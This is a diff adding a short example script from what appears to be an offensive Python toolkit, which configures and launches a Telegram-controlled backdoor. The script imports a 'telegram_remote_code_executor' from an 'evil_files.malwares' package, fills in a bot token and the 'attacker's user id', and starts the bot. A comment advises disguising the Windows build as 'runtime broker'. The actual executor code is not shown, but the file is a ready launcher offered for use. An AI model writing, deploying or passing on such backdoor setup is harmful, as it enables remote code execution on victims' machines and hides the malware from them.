+++ examples/Malwares/TelegramBackdoor.py
@@ -1,0 +1,14 @@
+from curses import start_color
+'''
+Controls the compromised machine using telegram
+'''
+import pyhtools.evil_files.malwares.telegram_remote_code_executor.TelegramRemoteCodeExecutor as evil_bot
+
+# set API_KEY and CHAT_ID before starting bot
+# Note: to find user id, start the bot, and message this bot with /start
+evil_bot.API_KEY = 'your_bot_key/token'
+evil_bot.CHAT_ID =  0 # int - attacker's user id
+
+# start bot 
+# Note: for windows create malware with runtime broker
+evil_bot.start_bot()
